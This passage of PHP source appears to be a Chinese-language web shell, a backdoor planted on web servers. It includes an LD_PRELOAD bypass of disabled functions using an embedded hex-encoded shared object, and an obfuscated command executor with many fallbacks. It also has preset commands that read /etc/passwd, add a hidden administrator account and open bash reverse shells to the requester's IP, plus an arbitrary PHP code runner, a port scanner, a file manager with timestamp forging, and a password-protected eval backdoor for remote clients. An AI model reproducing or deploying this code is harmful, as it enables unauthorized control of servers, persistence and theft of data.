000000000000c004000000000000f0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000b005000000000000b005000000000000480000000000000003000000160000000800000000000000180000000000000078000000010000000600000000000000f805000000000000f8050000000000001700000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000001006000000000000100600000000000040000000000000000000000000000000100000000000000010000000000000007e00000001000000060000000000000050060000000000005006000000000000080000000000000000000000000000000800000000000000000000000000000087000000010000000600000000000000600600000000000060060000000000009e010000000000000000000000000000100000000000000000000000000000008d00000001000000060000000000000000080000000000000008000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000090800000000000009080000000000000f000000000000000000000000000000010000000000000000000000000000009b000000010000000200000000000000180800000000000018080000000000001c00000000000000000000000000000004000000000000000000000000000000a9000000010000000200000000000000380800000000000038080000000000006400000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000f00d200000000000f00d0000000000001000000000000000000000000000000008000000000000000000000000000000bf0000000f0000000300000000000000000e200000000000000e0000000000000800000000000000000000000000000008000000000000000000000000000000cb000000010000000300000000000000080e200000000000080e0000000000000800000000000000000000000000000008000000000000000000000000000000d0000000060000000300000000000000100e200000000000100e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000d00f200000000000d00f0000000000003000000000000000000000000000000008000000000000000800000000000000d9000000010000000300000000000000001020000000000000100000000000003000000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000301020000000000030100000000000000800000000000000000000000000000008000000000000000000000000000000e8000000080000000300000000000000381020000000000038100000000000000800000000000000000000000000000001000000000000000000000000000000ed0000000100000030000000000000000000000000000000381000000000000035000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000002c18000000000000f6000000000000000000000000000000010000000000000000000000000000000100000002000000000000000000000000000000000000007010000000000000b8050000000000001c0000002f0000000800000000000000180000000000000009000000030000000000000000000000000000000000000028160000000000000402000000000000000000000000000001000000000000000000000000000000';
				}
				@file_put_contents($so_path , pack('H*' , $file_code));
			}

			$out_path     = '/tmp/' . Foundation::returnRand(6);
			$command_line = $content . " > " . $out_path . " 2>&1";
			putenv("CDL=$command_line");
			putenv("LD_PRELOAD=$so_path");
			$a      = getenv("CDL");
			$b      = getenv("LD_PRELOAD");
			$result .= "<div class='main-content'><div class='result'><span>执行命令</span><div class='tip'>$command_line</div></div><div class='result' ><span>命令环境变量</span><div class='tip'>$a</div></div><div class='result'><span>so文件环境变量</span><div class='tip'>$b</div></div>";

			switch ($type) {
				case '1':
					mail('' , '' , '' , '');
					break;
				case '2':
					imap_mail('' , '' , '' , '');
					break;
				case '3':
					error_log('' , '' , '' , '');
					break;
				case '4':
					mb_send_mail('' , '' , '' , '');
					break;
			}
			$return_content = nl2br(file_get_contents($out_path));
			@unlink($out_path);
			$result .= '<div class="result"><span>执行命令回显</span>' . '<div  class="tip">' . $return_content . '</div></div><div>';
		}
		return $result;
	}
}

class Foundation {

	public static function getCfg ($var_name) {
		switch ($result = get_cfg_var($var_name)) {
			case 0:
				return "No";
				break;
			case 1:
				return "Yes";
				break;
			default:
				return $result;
				break;
		}
	}

	public static function funAlive ($fun_name) {
		return (false !== function_exists($fun_name)) ? "Yes" : "No";
	}

	public static function getSysInfo () {
		$result    = <<<EOF
<style>a{color:#767b80;text-decoration:none;}table{margin:0 auto;width:900px;border-spacing:0;border-collapse:collapse;}td{border:1px solid #ededed;padding:12px 20px;}td:first-child{width:250px;text-align:right;}td:last-child{text-align:left;}tr:nth-child(odd){}tr:nth-child(even){background:#f9f9f9;}tr:hover{background:#f5f5f5;}</style>
EOF;
		$dis_func  = get_cfg_var("disable_functions");
		$upsize    = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
		$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:" . $_SERVER['SERVER_ADMIN'] . "\">" . $_SERVER['SERVER_ADMIN'] . "</a>" : "<a href=\"mailto:" . get_cfg_var("sendmail_from") . "\">" . get_cfg_var("sendmail_from") . "</a>";
		if ($dis_func == "") {
			$dis_func = "No";
		} else {
			$dis_func = str_replace(" " , "<br>" , $dis_func);
			$dis_func = str_replace("," , "<br>" , $dis_func);
		}
		$phpinfo = (!preg_match("phpinfo" , $dis_func)) ? "Yes" : "No";
		$info    = [
			["服务器时间/北京时间" , date("Y年m月d日 h:i:s" , time()) . "&nbsp;/&nbsp;" . gmdate("Y年n月j日 H:i:s" , time() + 8 * 3600)] ,
			["服务器域名:端口<br>[ip:port]" , "<a href=\"http://" . $_SERVER['SERVER_NAME'] . "\" target=\"_blank\">" . $_SERVER['SERVER_NAME'] . "</a>:" . $_SERVER['SERVER_PORT'] . " ( " . gethostbyname($_SERVER['SERVER_NAME']) . " )"] ,
			["服务器操作系统(文字编码)" , PHP_OS . " (" . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . ")"] ,
			["服务器解译引擎" , $_SERVER['SERVER_SOFTWARE']] ,
			["你的IP" , getenv('REMOTE_ADDR')] ,
			["PHP运行方式(版本)" , strtoupper(php_sapi_name()) . "(" . PHP_VERSION . ") / 安全模式:" . self::getCfg("safemode")] ,
			["服务器管理员" , $adminmail] ,
			["本文件路径" , __FILE__] ,
			["允许使用URL打开文件<br>[allow_url_fopen]" , self::getCfg("allow_url_fopen")] ,
			["允许动态加载链接库<br>[enable_dl]" , self::getCfg("enable_dl")] ,
			["显示错误信息<br>[display_errors]" , self::getCfg("display_errors")] ,
			["自定义全局变量<br>[register_globals]" , self::getCfg("register_globals")] ,
			["自动字符串转义<br>[magic_quotes_gpc]" , self::getCfg("magic_quotes_gpc")] ,
			["最多内存使用量<br>[memory_limit]" , self::getCfg("memory_limit")] ,
			["POST最大字节<br>[post_max_size]" , self::getCfg("post_max_size")] ,
			["允许最大上传<br>[upload_max_filesize]" , $upsize] ,
			["程序最长运行时间<br>[max_execution_time]" , self::getCfg("max_execution_time") . "秒"] ,
			["禁用函数<br>[disable_functions]" , $dis_func] ,
			["程序信息函数<br>[phpinfo()]" , $phpinfo] ,
			["目前还有空余空间<br>[diskfreespace]" , intval(diskfreespace(".") / (1024 * 1024)) . 'Mb'] ,
			["GZ压缩文件支持<br>[zlib]" , self::funAlive("gzclose")] ,
			["ZIP压缩文件支持<br>[ZipArchive(php_zip)]" , self::funAlive("zip_open")] ,
			["IMAP电子邮件系统" , self::funAlive("imap_close")] ,
			["XML解析" , self::funAlive("xml_set_object")] ,
			["FTP登陆" , self::funAlive("ftp_login")] ,
			["Session支持" , self::funAlive("session_start")] ,
			["Socket支持" , self::funAlive("fsockopen")] ,
			["MySQL数据库" , self::funAlive("mysql_close")] ,
			["MSSQL数据库" , self::funAlive("mssql_close")] ,
			["Postgre SQL数据库" , self::funAlive("pg_close")] ,
			["SQLite数据库" , self::funAlive("sqlite_close")] ,
			["Oracle数据库" , self::funAlive("ora_close")] ,
			["Oracle 8数据库" , self::funAlive("OCILogOff")] ,
			["SyBase数据库" , self::funAlive("sybase_close")] ,
			["Hyperwave数据库" , self::funAlive("hw_close")] ,
			["InforMix数据库" , self::funAlive("ifx_close")] ,
			["FilePro数据库" , self::funAlive("filepro_fieldcount")] ,
			["DBA/DBM连接" , self::funAlive("dba_close") . "&nbsp;/&nbsp;" . self::funAlive("dbmclose")] ,
			["ODBC/dBASE连接" , self::funAlive("odbc_close") . "&nbsp;/&nbsp;" . self::funAlive("dbase_close")] ,
			["PREL相容语法<br>[PCRE]" , self::funAlive("preg_match")] ,
			["PDF支持" , self::funAlive("pdf_close")] ,
			["图形处理<br>[GD Library]" , self::funAlive("imageline")] ,
			["SNMP网络管理协议" , self::funAlive("snmpget")] ,
		];
		$result  .= '<table>';
		for ($i = 0; $i < count($info); $i ++) {
			$result .= '<tr><td>' . $info[$i][0] . '</td><td>' . $info[$i][1] . '</td></tr>' . "\n";
		}
		$result .= '</table>';
		return $result;
	}

	public static function getPhpInfo () {
		date_default_timezone_set('Asia/Shanghai');
		phpinfo();
		$i = ob_get_contents();
		ob_end_clean();
		$html   = str_replace("module_Zend Optimizer" , "module_Zend_Optimizer" , preg_replace('%^.*<body>(.*)</body>.*$%ms' , '$1' , $i));
		$html   = str_replace(' width="600"' , '' , $html);
		$result = <<<STR
<style type="text/css">*{font-family:Consolas !important;}body{width:98%;}pre{margin:0px;font-family:monospace;}a:link{color:#000099;text-decoration:none;}table{margin-left:auto;width:100%;border-collapse:collapse;margin-right:auto;text-align:left;}div{box-sizing:border-box;}th{font-weight:bold;background:#eee;}td,th{border:1px solid #000000;vertical-align:baseline;font-size:14px;padding:5px;}.center{padding-left: 30px}</style>
{$html}

STR;
		return $result;
	}

	public static function chatRobot () {
		$res = '我是您的智能聊天助手，请问我问题吧~';
		$cmd = isset($GLOBALS['_POST']['content']) ? htmlspecialchars(Decrypt::run($GLOBALS['_POST']['content'])) : 'dir';
		if (!empty($GLOBALS['_POST']['content'])) {
			$res = self::DeMarcia(Decrypt::run($GLOBALS['_POST']['content']));
		}
		$result = <<<END
<style>.input-box{margin-bottom:20px;}.input-box span:first-child{display:inline-block;width:100px;font-size:18px;color:#333;text-align:left;}.input-text{vertical-align:middle;}.input-text2{vertical-align:top;}select{height:40px;margin:0 5px;outline:none;background:#fff;border:1px solid #ccc;font-size:14px;vertical-align:middle;color:#333;line-height:40px;}textarea{padding:10px;border-radius:4px;font-size:16px;border:1px solid #CCC;line-height:24px;color:#333;outline:none;width:660px;height:520px;}textarea:focus,input:focus{box-shadow:0 0 8px rgba(51,51,51,.6);}input{height:40px;padding:6px 12px;font-size:17px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;outline:none;vertical-align:middle;}input[type='submit']{width:100px;cursor:pointer;font-size:14px;}input[type='submit']:hover{background:#ededed;}form{text-align:center;padding-right:150px;}</style>
<script language="javascript">function cHandle(i){Str=new Array(14);Str[0]="dir";Str[1]="ifconfig";Str[2]="cat /etc/passwd";Str[3]="uname -a";Str[4]="copy c://1.php d://2.php";Str[5]="tasklist /svc";Str[6]="net user aDm1nIsTrat0R 1QazXsw@ /add & net localgroup administrators aDm1nIsTrat0R /add";Str[7]="net user";Str[8]="netstat -an";Str[9]="lsb_release -a";Str[10]="gcc -o /tmp/something /tmp/something.c";Str[11]="chmod 777 /tmp/something.c";Str[12]="bash -i >& /dev/tcp/{$_SERVER["REMOTE_ADDR"]}/2366 0>&1";Str[13]="0<&123;exec 123<>/dev/tcp/{$_SERVER["REMOTE_ADDR"]}/12666; sh <&123 >&123 2>&123";document.getElementById('content').value=Str[i];return true}function SubmitUrl(){document.getElementById('content').value=base64encode(document.getElementById('content').value);document.getElementById('gform').submit()}</script>
<form method="POST"name="gform"id="gform"action="?action=zxft"><div class="input-box"><span class="input-text">输入内容</span><input type="text"name="content"id="content"value="{$cmd}"style="width:464px;"><select onchange='return cHandle(options[selectedIndex].value)'><option value="0"selected>内容大全</option><option value="1">查看IP</option><option value="2">查看配置</option><option value="3">查看内核</option><option value="4">复制文件</option><option value="5">查看进程</option><option value="6">添加管理</option><option value="7">用户列表</option><option value="8">查看网络</option><option value="9">查看版本</option><option value="10">编译文件</option><option value="11">更改属性</option><option value="12">bash反弹</option><option value="13">linux反弹</option></select><input type="submit"value="发送"onclick="SubmitUrl();"></div><div class="input-box"><span class="input-text2">返回结果</span><textarea name="show">{$res}</textarea></div></form>
END;
		return $result;
	}

	public static function DeMarcia ($string) {
		$res = '';
		$a   = StringHandler::getPen();
		$b   = StringHandler::getPineapple();
		$c   = 's' ./*-*/
			'h'/*-*/ . 'ell_' . $a;
		$d   = StringHandler::getBanana();
		$e   = StringHandler::getOrange();
		$g   = StringHandler::getGrape();

		if (function_exists($a)) {
			@$a($string , $res);
			$res = join("\n" , $res);
		} else if (function_exists($c)) {
			$res = @$c($string);
		} else if (function_exists($b)) {
			@ob_start();
			@$b($string);
			$res = @ob_get_contents();
			@ob_end_clean();
		} else if (function_exists($d)) {
			@ob_start();
			@$d($string);
			$res = @ob_get_contents();
			@ob_end_clean();
		} else if (@is_resource($f = @popen($string , 'r'))) {
			$res = '';
			while (!@feof($f)) {
				$res .= @fread($f , 1024);
			}
			@pclose($f);
		} else if (substr(THEPATH , 0 , 1) != "/" && class_exists('COM')) {
			$w   = new /*-*/ COM($e);
			$er  = self::callBlack($w , $string);
			$f   = self::callBlue($er);
			$res = self::callWhite($f);
		} else if (function_exists($g)) {
			$lf = null;
			$p  = StringHandler::getApple($string , [1 => ['pipe' , 'w'] , 2 => ['pipe' , 'w']] , $lf);
			while (!feof($lf[1])) {
				$res .= htmlspecialchars(fgets($lf[1]) , ENT_COMPAT , 'UTF-8');
			}
			while (!feof($lf[2])) {
				$res .= htmlspecialchars(fgets($lf[2]) , ENT_COMPAT , 'UTF-8');
			}
			fclose($lf[1]);
			fclose($lf[2]);
			proc_close($p);
		}
		return $res;
	}

	public static function magicMaster () {
		$php_code = isset($GLOBALS['_POST']['content']) ? htmlspecialchars(Decrypt::run($GLOBALS['_POST']['content'])) : "echo '<div style=\"text-align:center;color:blue\">Hello world</div>';";
		$result   = <<<EOF
<style>textarea,.result{padding:10px;border-radius:4px;font-size:16px;border:1px solid #CCC;line-height:24px;color:#333;outline:none;width:390px;height:520px;vertical-align:middle;resize:none;display:inline-block;box-sizing:border-box;overflow:auto;}textarea:focus{box-shadow:0 0 8px rgba(51,51,51,.6);}.der{text-align:left;color:#333;font-size:16px;width:850px;margin:0 auto 15px;}form{padding:0 70px 0 20px;text-align:center;}.result .child{display:block !important;}input[type=submit]{outline:none;padding:0;box-sizing:content-box;vertical-align:middle;height:135px;line-height:135px;width:40px;border-radius:4px;margin:0 15px;}</style>
<script language="javascript">function submitUrl(){document.getElementById('content').value = base64encode(document.getElementById('content').value);document.getElementById('sendcode').submit();}</script>
<form method="POST" id="sendcode" ><div class="der">在左边写上你的愿望，右边会有魔法师帮你实现哦~</div><div style="font-size: 0"><textarea COLS="120" ROWS="35" name="content" id="content">$php_code</textarea><input type="submit" value=">>" onclick="submitUrl();"><div class="result">
EOF;
		if (!empty($GLOBALS['_POST']['content'])) {
			echo '<div style="display: none" class="child">';
			StringHandler::returnStr(stripslashes(Decrypt::run($GLOBALS['_POST']['content'])));
			$result .= ob_get_contents();
			echo '</div>';
		}
		$result .= '</div></div></form>';
		return $result;
	}

	public static function portEye () {
		$port_ip   = isset($GLOBALS['_POST']['content']) ? Decrypt::run($GLOBALS['_POST']['content']) : '127.0.0.1';
		$port_port = isset($GLOBALS['_POST']['method']) ? Decrypt::run($GLOBALS['_POST']['method']) : '';
		$result    = <<<END
<form method="POST" name="iform" id="iform" action="?action=bsjs"><div class="input-box"><span>扫描IP</span><input type="text" id="content" name="content" value="{$port_ip}"> </div><div class="input-box"><span>端口号</span><input type="text" id="method" name="method" value="{$port_port}" ></div><input type="submit" value="扫描" onclick="SubmitUrl();"><div class="tip">常见端口：20-30,53,67-69,80-90,110,111,137-139,143,161,162,389,445,443,512-514,873,1099,1194,1352,1433,1434,1500,1521,1723,2049,2082,2083,2181,2375,2601,2604,3128,3312,3311,3306,3389,3690,4750,4848,5000,5432,5632,5900-5902,5984,6379,7001-7010,7778,8000-8010,8069,8080-8090,8440-8450,9000-9010,9043,9080-9090,9200-9300,10000-10002,11211,27017,27018,50000,50030,50070</div></form>
<script language="javascript">function SubmitUrl(){document.getElementById('content').value = base64encode(document.getElementById('content').value);document.getElementById('method').value = base64encode(document.getElementById('method').value);document.getElementById('ifrom').submit();}</script>
<style>form{text-align:center;padding-right:50px;}.tip{width:875px;margin:20px auto;font-size:16px;line-height:26px;color:#666;padding:10px;border:1px solid #ededed;border-radius:4px;word-wrap:break-word;word-break:break-all;text-align:left;}input[type=submit]{margin-left:30px;padding:6px 15px;}.input-box:first-child{text-align:left;display:inline-block;width:270px;}.input-box:first-child input{width:180px;display:inline-block;vertical-align:middle;}.input-box:nth-child(2){text-align:left;width:500px;display:inline-block;}.input-box:nth-child(2) input{width:420px;display:inline-block;vertical-align:middle;}.input-box span{font-size:18px;color:#333;vertical-align:middle;display:inline-block;margin-right:4%;}input{height:40px;padding:6px 12px;font-size:17px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;outline:none;vertical-align:middle;}.result-box{width:875px;margin:0 auto;padding-right:50px;}.result-title{font-size:18px;color:#333;margin-bottom:10px;height:35px;line-height:35px}.result-item-open{display:inline-block;padding:4px 15px;border:1px solid #9dd69f;font-size:16px;border-radius:4px;margin-right:15px;color:#9dd69f;margin-bottom:10px;}.result-item-close{font-size:16px;padding:4px 15px;border:1px solid #999;border-radius:4px;margin-right:15px;display:inline-block;margin-bottom:10px;color:#999;}</style>
END;
		if ((!empty($GLOBALS['_POST']['content'])) && (!empty($GLOBALS['_POST']['method']))) {
			$ports_array = explode(',' , Decrypt::run($GLOBALS['_POST']['method']));
			$ports       = [];
			foreach ($ports_array as $value) {
				if (preg_match('/(\d+)-(\d+)/' , $value , $tmp)) {
					for ($j = $tmp[1]; $j < $tmp[2] + 1; $j ++) {
						$ports[] = (int) $j;
					}
				} else {
					$ports[] = (int) $value;
				}
			}
			$open_result  = '';
			$close_result = '';
			for ($i = 0; $i < count($ports); $i ++) {
				if ($ports[$i]) {
					$fp = @fsockopen(Decrypt::run($GLOBALS['_POST']['content']) , $ports[$i] , $errno , $errstr , 2);
					if ($fp) {
						$open_result .= "<span class='result-item-open'>$ports[$i]</span>";
					} else {
						$close_result .= "<span class='result-item-close'>$ports[$i]</span>";
					}
				}
				ob_flush();
				flush();
			}
			$result .= "<div class='result-box'><div class='result-title'>开放端口</div><div>$open_result</div><div class='result-title'>关闭端口</div><div>$close_result</div></div>";
		}
		return $result;
	}

	public static function swordHtml () {
		$result = <<<EOF
<style>.sug-box{width:700px;padding-right:50px;margin:0 auto;}.sug{font-size:18px;color:#333;margin-bottom:30px;}.sug-content{color:#666;font-size:16px;line-height:30px;}.active{display:block;margin-top:10px;background-color:#f8f8f8;padding:10px 20px;color:#666;margin-bottom:30px;border-radius:4px;border:1px solid #ccc;}</style>
<div class="sug-box"><div class="sug">本模块可使用切菜使用的工具、来自德玛西亚蚂蚁的武器等管理端进行连接</div><div class="sug-content"><div><div>连接地址：</div><span class="active">http://website.com/script.php?action=cxk&e=cmVfc19ldF9hX2xpX2Fz</span></div><div><div>密码：</div><span class="active">singdancerapbasketball</span></div><div><div>连接配置: </div><span class="active">Cookie:PHPSESSIDS=5dce171e2fab0814d67170153804f937</span></div></div></div>
EOF;
		return $result;
	}

	public static function sword () {
		$e = explode('_' , Decrypt::run($_REQUEST['e']));
		$f = $e[3] . $e[1] . $e[5][1] . $e[2][0] . $e[0][0] . $e[2][1];
		$f($GLOBALS['_POST']['singdancerapbasketball']);
	}

	public static function returnRand ($pw_length) {
		$rand_str = '';
		for ($i = 0; $i < $pw_length; $i ++) {
			$rand_str .= chr(mt_rand(97 , 122));
		}
		return $rand_str;
	}

	public static function callBlack ($class , $string) {
		return $class->exec($string);
	}

	public static function callBlue ($class) {
		return $class->StdOut();
	}

	public static function callWhite ($class) {
		return $class->ReadAll();
	}

}

class FileHandler {

	private $msg;

	private $p;

	function __construct () {
		$this->msg = ["0" => "保存成功" , "1" => "保存失败" , "2" => "上传成功" , "3" => "上传失败" , "4" => "修改成功" , "5" => "修改失败" , "6" => "删除成功" , "7" => "删除失败"];
		$this->p   = isset($GLOBALS['_GET']['path']) ? urldecode(Decrypt::run($GLOBALS['_GET']['path'])) : "";
	}

	public function filePathFormat ($string) {
		return str_replace('//' , '/' , str_replace('\\' , '/' , $string));
	}

	public function fileMode () {
		$RealPath = realpath('./');
		$SelfPath = $_SERVER['PHP_SELF'];
		$SelfPath = substr($SelfPath , 0 , strrpos($SelfPath , '/'));
		return self::filePathFormat(substr($RealPath , 0 , strlen($RealPath) - strlen($SelfPath)));
	}

	public function getFileSize ($size) {
		$kb = 1024;
		$mb = 1024 * $kb;
		$gb = 1024 * $mb;
		$tb = 1024 * $gb;
		if ($size < $kb) {
			return $size . " B";
		} else if ($size < $mb) {
			return round($size / $kb , 2) . " K";
		} else if ($size < $gb) {
			return round($size / $mb , 2) . " M";
		} else if ($size < $tb) {
			return round($size / $gb , 2) . " G";
		} else {
			return round($size / $tb , 2) . " T";
		}
	}

	public function renameFile () {

		$q       = isset($GLOBALS['_GET']['newname']) ? Decrypt::run($GLOBALS['_GET']['newname']) : "";
		$p_path  = dirname($this->p);
		$content = @rename($this->p , $p_path . '/' . $q) ? $this->msg[4] : $this->msg[5];
		$url     = "?action=wjdc&path=" . base64_encode($p_path);
		HtmlOutput::tips($content , $url);
	}

	public function readFile ($filename) {
		$handle    = @fopen($filename , "rb");
		$file_code = @fread($handle , @filesize($filename));
		@fclose($handle);
		return $file_code;
	}

	public function writeFile ($filename , $file_mode , $file_code) {
		$key    = true;
		$handle = @fopen($filename , $file_mode);
		if (!@fwrite($handle , $file_code)) {
			@chmod($filename , 0666);
			$key = @fwrite($handle , $file_code) ? true : false;
		}
		@fclose($handle);
		return $key;
	}

	public function copyFile () {

		$new_path = explode('/' , Decrypt::run($GLOBALS['_GET']['newcopy']));
		$pathr[0] = $new_path[0];
		for ($i = 1; $i < count($new_path); $i ++) {
			$pathr[] = urlencode($new_path[$i]);
		}
		$new_copy = implode('/' , $pathr);
		$content  = @copy($this->p , $new_copy) ? $this->msg[4] : $this->msg[5];
		$url      = "?action=wjdc&path=" . base64_encode(urlencode(dirname($this->p)));
		HtmlOutput::tips($content , $url);
	}

	public function moveFile ($file_a , $file_b) {
		$key = @copy($file_a , $file_b) ? true : false;
		if (!$key) $key = @move_uploaded_file($file_a , $file_b) ? true : false;
		return $key;
	}

	public function deleteDir ($del_dir) {
		$file_arr = self::getDirArray($del_dir);
		foreach ($file_arr as $del) {
			if (is_dir($del)) {
				if (!self::deleteDir($del)) return false;
			} else if (!is_dir($del)) {
				@chmod($del , 0777);
				if (!@unlink($del)) return false;
			}
		}
		@chmod($del_dir , 0777);
		if (!@rmdir($del_dir)) return false;
		return true;
	}

	public function deleteDirFile () {
		$p_path  = dirname($this->p);
		$content = self::deleteDir($this->p) ? $this->msg[6] : $this->msg[7];
		$url     = "?action=wjdc&path=" . base64_encode($p_path);
		HtmlOutput::tips($content , $url);
	}

	public function deleteFile () {
		$p_path  = dirname($this->p);
		$content = @unlink($this->p) ? $this->msg[6] : $this->msg[7];
		$url     = "?action=wjdc&path=" . base64_encode($p_path);
		HtmlOutput::tips($content , $url);
	}

	public function getFileType ($file) {
		$it = substr($file , - 3);
		switch ($it) {
			case "jpg":
			case "gif":
			case "bmp":
			case "png":
			case "ico":
				return 'img';
				break;
			case "htm":
			case "tml":
				return 'html';
				break;
			case "exe":
			case "com":
				return 'exe';
				break;
			case "asp":
				return 'aspx';
				break;
			case "css":
				return 'css';
				break;
			case "xml":
			case "doc":
				return 'xml';
				break;
			case "php":
				return 'php';
				break;
			case "jsp":
			case "java":
				return 'jsp';
				break;
			case ".js":
			case "vbs":
				return 'js';
				break;
			case "mp3":
			case "wma":
			case "wav":
			case "swf":
			case ".rm":
			case "avi":
			case "mp4":
			case "mvb":
				return 'mp3';
				break;
			case "rar":
			case "tar":
			case ".gz":
			case "iso":
				return 'rar';
				break;
			case "zip":
				return 'zip';
			default:
				return 'file';
				break;
		}
	}

	public function downloadFile () {
		$file = isset($GLOBALS['_GET']['path']) ? urldecode(Decrypt::run($GLOBALS['_GET']['path'])) : '';
		if (!@file_exists($file)) HtmlOutput::message('下载文件不存在');
		$file_info = pathinfo($file);
		header('Content-type: application/x-' . $file_info['extension']);
		header('Content-Disposition: attachment; filename=' . $file_info['basename']);
		header('Content-Length: ' . filesize($file));
		@readfile($file);
		exit;
	}

	public function downloadZip ($filecode , $file) {
		header("Content-type: application/unknown");
		header('Accept-Ranges: bytes');
		header("Content-length: " . strlen($filecode));
		header("Content-disposition: attachment; filename=" . $file . ";");
		echo $filecode;
		exit;
	}

	public function fileAction ($array , $type , $inver , $REAL_DIR) {
		if (($count = count($array)) == 0) return '请选择文件';
		if ($type == 'e') {
			function listfiles ($dir = "." , $faisunZIP , $mydir) {
				$sub_file_num = 0;
				if (is_file($mydir . "$dir")) {
					if (realpath($faisunZIP->gzfilename) != realpath($mydir . "$dir")) {
						$faisunZIP->addFile(file_get_contents($mydir . $dir) , "$dir");
						return 1;
					}
					return 0;
				}

				$handle = opendir($mydir . "$dir");
				while ($file = readdir($handle)) {
					if ($file == "." || $file == "..") continue;
					if (is_dir($mydir . "$dir/$file")) {
						$sub_file_num += listfiles("$dir/$file" , $faisunZIP , $mydir);
					} else {
						if (realpath($faisunZIP->gzfilename) != realpath($mydir . "$dir/$file")) {
							$faisunZIP->addFile(file_get_contents($mydir . $dir . "/" . $file) , "$dir/$file");
							$sub_file_num ++;
						}
					}
				}
				closedir($handle);
				if (!$sub_file_num) $faisunZIP->addFile("" , "$dir/");
				return $sub_file_num;
			}

			function num_bitunit ($num) {
				$bitunit = [' B' , ' KB' , ' MB' , ' GB'];
				for ($key = 0; $key < count($bitunit); $key ++) {
					if ($num >= pow(2 , 10 * $key) - 1) { //1023B 会显示为 1KB
						$num_bitunit_str = (ceil($num / pow(2 , 10 * $key) * 100) / 100) . " $bitunit[$key]";
					}
				}
				return $num_bitunit_str;
			}

			$mydir = $REAL_DIR;
			if (is_array($array)) {
				$faisunZIP = new PhpZip;
				if ($faisunZIP->startFile("$inver")) {
					$filenum = 0;
					foreach ($array as $file) {
						$filenum += listfiles($file , $faisunZIP , $mydir);
					}
					$faisunZIP->createFile();
					return "压缩完成,共添加 $filenum 个文件。 <a href='$inver'>点击下载 $inver (" . num_bitunit(filesize("$inver")) . ")</a>";
				} else {
					return "$inver 不能写入,请检查路径或权限是否正确。";
				}
			} else {
				return "没有选择的文件或目录。";
			}
		}
		$i = 0;
		while ($i < $count) {
			$array[$i] = urldecode($array[$i]);
			switch ($type) {
				case "a" :
					$inver = urldecode($inver);
					if (!is_dir($inver)) return '路径错误';
					$filename = array_pop(explode('/' , $array[$i]));
					@copy($array[$i] , self::filePathFormat($inver . '/' . $filename));
					$msg = '复制到' . $inver . '目录';
					break;
				case "b" :
					$filename = array_pop(explode('/' , $array[$i]));
					if (!@unlink($array[$i])) {
						@chmod($filename , 0666);
						@unlink($array[$i]);
					}
					$msg = '删除';
					break;
				case "c" :
					if (!preg_match("/^[0-7]{4}$/i" , $inver)) return '属性值错误';
					$newmode = base_convert($inver , 8 , 10);
					@chmod($REAL_DIR . $array[$i] , $newmode);
					$msg = '属性修改为 ' . $inver;
					break;
				case "d" :
					@touch($array[$i] , strtotime($inver));
					$msg = '修改时间为 ' . $inver;
					break;
			}
			$i ++;
		}
		return '所选文件 ' . $msg . ' 完毕';
	}

	public function getDirArray ($filepath) {
		$show = [];
		$dir  = dir($filepath);
		while ($file = $dir->read()) {
			if ($file == '.' or $file == '..') continue;
			$files  = self::filePathFormat($filepath . '/' . $file);
			$show[] = $files;
		}
		$dir->close();
		return $show;
	}

	public function getFileOwner ($File) {
		if (PATH_SEPARATOR == ':') {
			if (function_exists('posix_getpwuid')) {
				$File = posix_getpwuid(fileowner($File));
			}
			return $File['name'];
		} else {
			return '';
		}
	}

	public function getFileGroup ($File) {
		if (PATH_SEPARATOR == ':') {
			if (function_exists('posix_getgrgid')) {
				$File = posix_getgrgid(filegroup($File));
			}
			return $File['name'];
		} else {
			return '';
		}
	}

	public function arrayIconv ($data , $output = 'utf-8') {
		$encode_arr = ['UTF-8' , 'ASCII' , 'GBK' , 'GB2312' , 'BIG5' , 'JIS' , 'eucjp-win' , 'sjis-win' , 'EUC-JP'];
		$encoded    = mb_detect_encoding($data , $encode_arr);

		if (!is_array($data)) {
			return mb_convert_encoding($data , $output , $encoded);
		} else {
			foreach ($data as $key => $val) {
				$key = $this->arrayIconv($key , $output);
				if (is_array($val)) {
					$data[$key] = $this->arrayIconv($val , $output);
				} else {
					$data[$key] = mb_convert_encoding($data , $output , $encoded);
				}
			}
			return $data;
		}
	}

	public function fileManage () {
		$path   = isset($GLOBALS['_GET']['path']) ? urldecode(Decrypt::run($GLOBALS['_GET']['path'])) : THEPATH . '/';
		$path_1 = base64_encode($path);
		$path_2 = base64_encode(dirname($path));
		$result = <<<EOF
<script language="javascript">
	function rusurechk(msg,url){smsg = "文件名: [" + msg + "] \\n请输出新文件名:";re = prompt(smsg,msg);if (re){url = url + base64encode(re);window.location = url;}}
	function rusuredel(msg,url){smsg = "确定要删除 [" + msg + "] 吗?";if(confirm(smsg)){URL = url + base64encode(msg);window.location = url;}}
	function Delok(msg,gourl){smsg = "确定要删除 [" + unescape(msg) + "] 吗?";if(confirm(smsg)){if(gourl == 'b'){document.getElementById('select_all').value = escape(gourl);document.getElementById('fileall').submit();}else window.location = gourl;}}
	function CheckAll(form){for(var i=0;i<form.elements.length;i++){var e = form.elements[i];if (e.name != 'chkall')e.checked = form.chkall.checked;}}
	function CheckDate(msg,gourl){smsg = "当前文件时间:[" + msg + "]";re = prompt(smsg,msg);if(re){var url = gourl + re;var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/;var r = re.match(reg);if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}else{document.getElementById('select_all').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}}}
	function SubmitUrl(msg,txt,actid){re = prompt(msg,unescape(txt));if(re){document.getElementById('select_all').value = actid;document.getElementById('inver').value = escape(re);document.getElementById('fileall').submit();}}
</script>

EOF;

		$dir      = @dir($path);
		$REAL_DIR = self::filePathFormat(realpath($path));

		if (!empty($GLOBALS['_POST']['type'])) {
